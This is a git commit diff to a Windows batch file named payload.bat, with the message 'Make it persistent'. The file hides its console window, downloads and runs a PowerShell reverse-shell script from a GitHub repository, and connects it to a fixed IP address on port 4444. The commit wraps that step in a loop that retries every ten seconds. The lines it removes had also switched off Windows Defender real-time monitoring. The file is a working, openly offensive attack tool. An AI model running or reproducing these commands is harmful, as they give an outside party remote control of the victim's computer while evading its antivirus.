80d4a97f40bb7b0e3cf529c3393ee7c0d43a1b08
Lorenzo Leonardo <enzotechcomputersolutions@gmail.com>
2023-02-10 23:03:04 +0800

    Make it persistent

--- payload.bat
+++ payload.bat
@@ -1,4 +1,6 @@
 @echo off
 powershell -window hidden -command ""
-powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
-powershell.exe IEX(IWR https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/Invoke-RemoteShell.ps1 -UseBasicParsing); Invoke-RemoteShell -RemoteIp 13.114.25.181 -RemotePort 4444 -Rows 24 -Cols 80
+:start
+powershell IEX(IWR https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/Invoke-RemoteShell.ps1 -UseBasicParsing); Invoke-RemoteShell -RemoteIp 13.114.25.181 -RemotePort 4444 -Rows 24 -Cols 80
+TIMEOUT /T 10
+goto start
